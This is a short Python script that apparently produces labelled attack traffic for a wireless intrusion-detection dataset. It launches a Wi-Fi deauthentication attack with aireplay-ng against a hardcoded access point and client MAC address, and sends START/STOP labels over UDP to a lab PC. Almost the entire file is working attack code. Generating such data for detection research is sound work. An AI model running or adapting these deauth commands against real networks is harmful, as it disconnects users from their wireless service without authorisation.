import os
import socket
import time

PC_IP = '192.168.220.50'
PC_PORT = 9999

BSSID = '78:44:76:fb:69:76'
TARGET_MAC = 'b0:cb:d8:c9:92:00'

def send_label(status):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(status.encode(), (PC_IP, PC_PORT))

print(">>> READY FOR ATTACK, NOTIFY THE LABELERS")
send_label("START")

# Send deauth frames in small batches to reduce interruption on ESP32
batch = 10
repeats = 5
pause_between_batches = 0.5

for i in range(repeats):
    print(f">>> Batch {i+1}/{repeats}: sending {batch} deauth frames")
    os.system(f"aireplay-ng -0 {batch} -a {BSSID} -c {TARGET_MAC} wlan0mon")
    time.sleep(pause_between_batches)

time.sleep(1)
send_label("STOP")
print(" >>> ATTACK IS FINISHED")
